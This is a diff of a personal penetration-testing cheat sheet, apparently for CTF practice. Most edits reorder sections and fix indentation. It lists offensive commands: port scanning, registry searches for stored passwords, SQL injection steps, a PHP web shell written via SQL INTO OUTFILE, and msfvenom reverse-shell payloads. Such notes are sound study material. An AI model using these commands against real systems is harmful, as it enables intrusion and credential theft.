@@ -5,8 +5,6 @@
 [Cheat sheets](https://pentestmonkey.net/)
 
 ## Automatic web enum
-- dirb | dirsearch
-- linpeas
 - wpsscan -U user -P password
 - [crackmapexec](https://www.crackmapexec.wiki/)
 
@@ -21,19 +19,19 @@
     - -sC default scripts
 
   - scripts
-    -   --script=nfs-ls,nfs-statfs,nfs-showmount
-    -   --script=smb-enum-shares.nse,smb-enum-users.nse
+    - --script=nfs-ls,nfs-statfs,nfs-showmount
+    - --script=smb-enum-shares.nse,smb-enum-users.nse
 
-    -  ports=$(sudo nmap -Pn -T4 $target -oN ports.txt | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//') && echo $ports
+    - ports=$(sudo nmap -Pn -T4 $target -oN ports.txt | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//') && echo $ports
 
 ### DNS
 - Port 53 UDP/TCP
   - -sU UDP
   - TCP: zone transfer
   - add entry to etc/hosts
-    -  echo "$target      domain" | sudo tee -a /etc/hosts
+    - echo "$target      domain" | sudo tee -a /etc/hosts
  - remove entry
-  -  sudo sed -i "/$target      domain/d" /etc/hosts
+  - sudo sed -i "/$target      domain/d" /etc/hosts
   
 - dig $target +short
   - dig $target -t RECORD +short
@@ -83,7 +81,11 @@
   - [suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
   - Empire modules:  /usr/share/powershell-empire/empire/server/modules/
 
-  ### Registry
+### Kerberos
+- Enumerate
+  - setspn -T medin -Q ​ */* = extract accounts from Service Principal Name
+
+### Registry
 - Passwords:
   - REG QUERY HKLM /F "password" /t REG_SZ /S /K
   - REG QUERY HKCU /F "password" /t REG_SZ /S /K
@@ -130,15 +132,20 @@
   - python3 -c  import pty;pty.spawn('/bin/bash') 
   - python -c 'import pty; pty.spawn("/bin/bash")'
   - export TERM=xterm
+  
+- Automatic
+  - linpeas
+  - 
 
 ## Web
+- dirb | dirsearch | gobuster | ffuz | wfuzz
 - Input fields / parameter
 - cgi-bin = content
   - Apache!!!!
     - /etc/apache2/sites-available/000-default.conf
     - /var/www/html
-- ffuf -u https://example.com/cgi-bin/FUZZ.cgi -w wordlist.txt
-- dirb http://$target -x Extensions (.pl .cgi .sh .ps1)
+    - ffuf -u https://example.com/cgi-bin/FUZZ.cgi -w wordlist.txt
+    - dirb http://$target -x Extensions (.pl .cgi .sh .ps1)
 - SQL endpoints
   - Find if crash
   - ORDER BY [Total_Columns]--
@@ -149,7 +156,6 @@
   - group_concat() = all values from != rows into one string
   - Where are files written? / DocumentRoot
     - SELECT "<?php system($_GET['cmd']); ?>" into outfile "PATH/TO/SQL"
-
 
 ## Upload files
 ### Windows
@@ -203,19 +209,15 @@ while bad_chars
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c
 ```
+
 ## Convert python
 dos2unix file
 
 ## Pictures
 - strings
 - exiftool
-- 
+
 ## Payloads
 - msfvenom - reverse -f aspx -o app.aspx
 - -e x86/shikata_ga_nai
 - windows/shell_reverse_tcp 
-
-### Kerberos
-- Enumerate
-  - setspn -T medin -Q ​ */* = extract accounts from Service Principal Name
-
